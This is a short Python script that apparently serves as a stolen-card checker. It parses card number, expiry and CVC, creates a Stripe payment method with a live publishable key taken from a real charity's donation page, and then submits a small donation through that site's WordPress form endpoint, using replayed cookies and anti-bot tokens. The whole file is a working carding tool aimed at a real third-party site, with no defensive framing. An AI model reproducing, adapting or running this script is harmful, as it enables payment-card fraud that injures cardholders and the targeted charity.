import requests,re

def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=85f933ec-7146-408f-bd2e-83b30848c089ebb1b5&muid=52b29ffe-7ee3-4dab-9d75-de5eebbe1aa93222a9&sid=8b589944-b11f-4414-a92e-42a1b614785f28e209&payment_user_agent=stripe.js%2Fd13c85e5a9%3B+stripe-js-v3%2Fd13c85e5a9%3B+card-element&referrer=https%3A%2F%2Fhamakom.community&time_on_page=52756&key=pk_live_lqY4WWcqFTqgMhqTP62LMGKt003UNcNxuX'

	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
    '_ga_F1EHKQ0JBP': 'GS2.1.s1748071235$o1$g0$t1748071235$j0$l0$h0',
    '_ga': 'GA1.2.1862670879.1748071236',
    '_gid': 'GA1.2.2051754516.1748071236',
    '_gat_gtag_UA_154761494_1': '1',
    '__stripe_mid': '52b29ffe-7ee3-4dab-9d75-de5eebbe1aa93222a9',
    '__stripe_sid': '8b589944-b11f-4414-a92e-42a1b614785f28e209',
}

	headers = {
    'authority': 'hamakom.community',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_ga_F1EHKQ0JBP=GS2.1.s1748071235$o1$g0$t1748071235$j0$l0$h0; _ga=GA1.2.1862670879.1748071236; _gid=GA1.2.2051754516.1748071236; _gat_gtag_UA_154761494_1=1; __stripe_mid=52b29ffe-7ee3-4dab-9d75-de5eebbe1aa93222a9; __stripe_sid=8b589944-b11f-4414-a92e-42a1b614785f28e209',
    'origin': 'https://hamakom.community',
    'referer': 'https://hamakom.community/donate/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    't': '1748071288747',
}

	data = {
    	'data': '__fluent_form_embded_post_id=332&_fluentform_24_fluentformnonce=e6f47c1f8c&_wp_http_referer=%2Fdonate%2F&payment_input=Choose%20another%20amount%20to%20donate&custom-payment-amount=1&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&phone=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&address_1%5Bcountry%5D=GB&payment_method=stripe&apbct_email_id__elementor_form=&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiY3VzdG9tLXBheW1lbnQtYW1vdW50IG5hbWVzW2ZpcnN0X25hbWVdIG5hbWVzW2xhc3RfbmFtZV0gZW1haWwgcGhvbmUgYWRkcmVzc18xW2FkZHJlc3NfbGluZV8xXSBhZGRyZXNzXzFbYWRkcmVzc19saW5lXzJdIGFkZHJlc3NfMVtjaXR5XSBhZGRyZXNzXzFbc3RhdGVdIGFkZHJlc3NfMVt6aXBdIGFkZHJlc3NfMVtjb3VudHJ5XSIsInZpc2libGVfZmllbGRzX2NvdW50IjoxMSwiaW52aXNpYmxlX2ZpZWxkcyI6Il9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQgX2ZsdWVudGZvcm1fMjRfZmx1ZW50Zm9ybW5vbmNlIF93cF9odHRwX3JlZmVyZXIgcGF5bWVudF9tZXRob2QgYXBiY3RfZW1haWxfaWRfX2VsZW1lbnRvcl9mb3JtIGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQiLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo2fX0%3D&ct_no_cookie_hidden_field=_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jaGVja2VkX2VtYWlscyI6IjAiLCJjdF9wc190aW1lc3RhbXAiOjE3NDgwNzEyMzUsImN0X2Nvb2tpZXNfdHlwZSI6Im5vbmUiLCJhcGJjdF9oZWFkbGVzcyI6ZmFsc2UsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IntcInZpc2libGVfZmllbGRzXCI6XCJjdXN0b20tcGF5bWVudC1hbW91bnQgbmFtZXNbZmlyc3RfbmFtZV0gbmFtZXNbbGFzdF9uYW1lXSBlbWFpbCBwaG9uZSBhZGRyZXNzXzFbYWRkcmVzc19saW5lXzFdIGFkZHJlc3NfMVthZGRyZXNzX2xpbmVfMl0gYWRkcmVzc18xW2NpdHldIGFkZHJlc3NfMVtzdGF0ZV0gYWRkcmVzc18xW3ppcF0gYWRkcmVzc18xW2NvdW50cnldXCIsXCJ2aXNpYmxlX2ZpZWxkc19jb3VudFwiOjExLFwiaW52aXNpYmxlX2ZpZWxkc1wiOlwiX19mbHVlbnRfZm9ybV9lbWJkZWRfcG9zdF9pZCBfZmx1ZW50Zm9ybV8yNF9mbHVlbnRmb3Jtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBwYXltZW50X21ldGhvZCBhcGJjdF9lbWFpbF9pZF9fZWxlbWVudG9yX2Zvcm0gYXBiY3RfdmlzaWJsZV9maWVsZHMgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZFwiLFwiaW52aXNpYmxlX2ZpZWxkc19jb3VudFwiOjd9IiwiY3RfaGFzX2lucHV0X2ZvY3VzZWQiOiJ0cnVlIiwiY3RfZmtwX3RpbWVzdGFtcCI6MTc0ODA3MTI0MywiY3RfcG9pbnRlcl9kYXRhIjoiW1s5NDQsNDg3LDg0MzVdLFs2MTQsMzEzLDEwNjQyXSxbMzUzLDcxMiwxMTY4MV0sWzQ0NCw0MzksMTMxODBdLFszMzAsODM3LDE1MTA1XSxbNDMyLDU5OCwxNjA3OF0sWzUwNiw3MDAsMTg0NDldLFs5MTMsMjQ2LDM1ODIyXV0iLCJjdF9zY3JlZW5faW5mbyI6IntcImZ1bGxXaWR0aFwiOjg5MSxcImZ1bGxIZWlnaHRcIjoxMjU4LFwidmlzaWJsZVdpZHRoXCI6ODkxLFwidmlzaWJsZUhlaWdodFwiOjEyNTd9IiwiY3RfY2hlY2tqcyI6MjE0Mjk1Mzg0NiwiY3RfdGltZXpvbmUiOjcsImFwYmN0X3BpeGVsX3VybCI6Imh0dHBzOi8vbW9kZXJhdGU4LXY0LmNsZWFudGFsay5vcmcvcGl4ZWwvYjAxZjk3NzFjMmMzM2QyMGM3NmQxYmQwMzU1Mjc1MDcuZ2lmIiwiYXBiY3Rfc2Vzc2lvbl9pZCI6Ind5eWRpIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL2hhbWFrb20uY29tbXVuaXR5L2RvbmF0ZS8iLCJ0eXBvIjpbXSwiY29sbGVjdGluZ191c2VyX2FjdGl2aXR5X2RhdGEiOnsiY2xpY2tzIjoxMH19&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '24',
}

	r2 = requests.post(
    'https://hamakom.community/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)

	return r2.json()
